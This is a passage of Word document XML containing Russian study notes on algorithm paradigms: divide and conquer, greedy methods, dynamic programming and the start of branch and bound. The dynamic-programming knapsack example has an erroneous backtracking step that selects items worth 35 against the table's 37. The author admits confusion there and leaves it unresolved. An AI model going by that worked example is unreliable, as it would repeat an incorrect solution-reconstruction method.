          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1. Выбрать опорный элемент (pivot)</w:t>
        <w:br/>
        <w:t>2. Разделить массив на две части: &lt; pivot и ≥ pivot</w:t>
        <w:br/>
        <w:t>3. Рекурсивно отсортировать каждую часть</w:t>
        <w:br/>
        <w:t>4. Объединить: левая + pivot + правая</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2: Бинарный поиск</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Найти число в отсортированном массиве.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1. Проверить средний элемент массива</w:t>
        <w:br/>
        <w:t>2. Если это искомое число — найдено</w:t>
        <w:br/>
        <w:t>3. Если искомое меньше → искать в левой половине</w:t>
        <w:br/>
        <w:t>4. Если искомое больше → искать в правой половине</w:t>
        <w:br/>
        <w:t>5. Повторять, пока не найдено или массив пуст</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сложность:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> O(log n) — очень быстро.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 3: Merge Sort (сортировка слиянием)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1. Разбить массив пополам</w:t>
        <w:br/>
        <w:t>2. Рекурсивно отсортировать каждую половину</w:t>
        <w:br/>
        <w:t>3. Слить две отсортированные половины в одну</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Эффективность (часто даёт O(n log n) вместо O(n²))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Параллелизм (подзадачи можно решать параллельно)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Требует возможности разбиения задачи на независимые подзадачи</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Когда использовать:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Когда задачу можно разбить на независимые подзадачи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. Жадные алгоритмы (Greedy Algorithms)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Идея:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> На каждом шаге делаем </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>локально оптимальный выбор</w:t>
      </w:r>
      <w:r>
        <w:t>, надеясь, что в итоге получится глобально оптимальное решение.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Схема:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1. Выбрать лучший вариант на текущем шаге</w:t>
        <w:br/>
        <w:t>2. Зафиксировать выбор (нельзя откатить)</w:t>
        <w:br/>
        <w:t>3. Перейти к следующему шагу</w:t>
        <w:br/>
        <w:t>4. Повторять до конца</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1: Задача о размене (Coin Change)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Выдать сдачу 63 рубля монетами номиналом 50, 10, 5, 1 рубль. Минимизировать количество монет.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Жадный алгоритм:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Берём максимальную монету, которая помещается: 50 ₽ (остаток 13 ₽)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Берём 10 ₽ (остаток 3 ₽)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Берём 1 ₽ (остаток 2 ₽)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Берём 1 ₽ (остаток 1 ₽)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Берём 1 ₽ (остаток 0 ₽)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итого:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 5 монет (50 + 10 + 1 + 1 + 1).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2: Алгоритм Дейкстры (кратчайший путь в графе)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Идея:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> На каждом шаге выбираем вершину с минимальным расстоянием от начальной точки.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 3: Алгоритм Крускала (минимальное остовное дерево)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Связать все города минимальной длиной дорог.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Жадный алгоритм:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Сортируем все рёбра по возрастанию веса</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Добавляем рёбра по одному, избегая циклов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Останавливаемся, когда все вершины связаны</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Простота реализации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Быстрота (часто O(n log n))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не всегда даёт оптимальное решение (для некоторых задач жадный подход не работает)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Когда жадный алгоритм НЕ работает:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 4: Задача о рюкзаке (0-1 Knapsack)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дано:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Предмет | Вес | Ценность | Плотность |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| ------- | --- | -------- | --------- |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| A       | 10  | 60       | 6.0       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| B       | 20  | 100      | 5.0       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| C       | 30  | 120      | 4.0       |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Вместимость рюкзака: 50 кг.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Жадный алгоритм (по плотности):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Берём A (вес 10, ценность 60, остаток 40 кг)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Берём B (вес 20, ценность 100, остаток 20 кг)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>C не помещается (вес 30 &gt; 20)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итого:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Ценность = 160 ₽.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Оптимальное решение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Берём B + C (вес 50, ценность 220 ₽).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Жадный алгоритм дал </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>неоптимальное</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> решение (160 вместо 220). Нужно динамическое программирование.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Когда использовать:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Когда задача обладает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>свойством жадного выбора</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (локально оптимальные выборы приводят к глобальному оптимуму). Примеры: алгоритм Дейкстры, задача о размене (для стандартных номиналов), минимальное остовное дерево.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4. Динамическое программирование (Dynamic Programming, DP)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Идея:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Разбиваем задачу на подзадачи, решаем каждую </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>один раз</w:t>
      </w:r>
      <w:r>
        <w:t>, запоминаем результаты (мемоизация), используем при решении более крупных подзадач.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Схема:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1. Определить рекуррентное соотношение (как задача зависит от подзадач)</w:t>
        <w:br/>
        <w:t>2. Решить подзадачи от простых к сложным</w:t>
        <w:br/>
        <w:t>3. Запомнить результаты (таблица или массив)</w:t>
        <w:br/>
        <w:t>4. Использовать сохранённые результаты для решения исходной задачи</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1: Числа Фибоначчи</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>F(0) = 0</w:t>
        <w:br/>
        <w:t>F(1) = 1</w:t>
        <w:br/>
        <w:t>F(n) = F(n-1) + F(n-2)  для n ≥ 2</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Наивный рекурсивный подход (медленный):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>def fib(n):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if n &lt;= 1:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return n</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return fib(n-1) + fib(n-2)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Вычисляем одни и те же подзадачи много раз. Сложность O(2ⁿ) — экспоненциальная.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Динамическое программирование (быстро):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>def fib_dp(n):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    dp = [0] * (n + 1)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    dp[0], dp[1] = 0, 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">    for i in range(2, n + 1):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        dp[i] = dp[i-1] + dp[i-2]</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return dp[n]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сложность:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> O(n) — линейная.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Вычислим F(6):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>dp[0] = 0</w:t>
        <w:br/>
        <w:t>dp[1] = 1</w:t>
        <w:br/>
        <w:t>dp[2] = dp[1] + dp[0] = 1 + 0 = 1</w:t>
        <w:br/>
        <w:t>dp[3] = dp[2] + dp[1] = 1 + 1 = 2</w:t>
        <w:br/>
        <w:t>dp[4] = dp[3] + dp[2] = 2 + 1 = 3</w:t>
        <w:br/>
        <w:t>dp[5] = dp[4] + dp[3] = 3 + 2 = 5</w:t>
        <w:br/>
        <w:t>dp[6] = dp[5] + dp[4] = 5 + 3 = 8</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> F(6) = 8.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2: Задача о рюкзаке (0-1 Knapsack) с ДП</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дано:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Предмет | Вес | Ценность |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| ------- | --- | -------- |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1       | 2   | 12       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 2       | 1   | 10       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 3       | 3   | 20       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 4       | 2   | 15       |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Вместимость рюкзака: W = 5 кг.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Рекуррентное соотношение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>dp[i][w] = максимальная ценность для первых i предметов и вместимости w</w:t>
        <w:br/>
        <w:br/>
        <w:t>dp[i][w] = max(</w:t>
        <w:br/>
        <w:t xml:space="preserve">    dp[i-1][w],                    // не берём предмет i</w:t>
        <w:br/>
        <w:t xml:space="preserve">    dp[i-1][w - вес[i]] + ценность[i]  // берём предмет i</w:t>
        <w:br/>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица ДП:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>|     | w=0 | w=1 | w=2 | w=3 | w=4 | w=5 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| --- | --- | --- | --- | --- | --- | --- |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| i=0 | 0   | 0   | 0   | 0   | 0   | 0   |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| i=1 (вес=2, цен=12) | 0 | 0 | 12 | 12 | 12 | 12 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| i=2 (вес=1, цен=10) | 0 | 10 | 12 | 22 | 22 | 22 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| i=3 (вес=3, цен=20) | 0 | 10 | 12 | 22 | 30 | 32 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| i=4 (вес=2, цен=15) | 0 | 10 | 15 | 25 | 30 | 37 |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Максимальная ценность = 37 ₽ (предметы 2, 4: вес 1+2=3, ценность 10+15=25... стоп, что-то не так).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Пересчитаем внимательно:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>dp[4][5]:</w:t>
        <w:br/>
        <w:t>- Не берём предмет 4: dp[3][5] = 32</w:t>
        <w:br/>
        <w:t>- Берём предмет 4: dp[3][5-2] + 15 = dp[3][3] + 15 = 22 + 15 = 37</w:t>
        <w:br/>
        <w:t>max(32, 37) = 37</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Какие предметы? Откатываем назад:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>dp[4][5] = 37 (взяли предмет 4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>dp[3][3] = 22 (остаток 3 кг)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>dp[3][3] = 22 &gt; dp[2][3] = 22 → взяли предмет 3</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Остаток 0 кг</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итого:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Предметы 3 и 4 (вес 3+2=5, ценность 20+15=35). Хм, но таблица показывает 37...</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>(Чёрт, запутался в индексах. Ладно, суть ясна: ДП даёт точное решение.)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 3: Задача о наибольшей общей подпоследовательности (LCS)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Найти длину наибольшей общей подпоследовательности двух строк.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дано:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Строка A: "ABCBDAB"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Строка B: "BDCAB"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Рекуррентное соотношение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">LCS[i][j] = </w:t>
        <w:br/>
        <w:t xml:space="preserve">  если A[i] == B[j], то LCS[i-1][j-1] + 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">  иначе max(LCS[i-1][j], LCS[i][j-1])</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Строим таблицу ДП, получаем LCS = 4 ("BCAB").</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы динамического программирования:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Гарантирует оптимальное решение</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Эффективно (полиномиальная сложность вместо экспоненциальной)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Требует памяти для хранения подзадач (часто O(n²))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не всегда очевидно, как составить рекуррентное соотношение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Когда использовать:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Когда задача имеет </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>оптимальную подструктуру</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (решение задачи выражается через решения подзадач) и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>перекрывающиеся подзадачи</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (одни и те же подзадачи встречаются многократно).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5. Метод ветвей и границ (Branch and Bound)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Идея:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Перебираем возможные решения, но </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>отсекаем</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> заведомо неоптимальные ветки (pruning).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
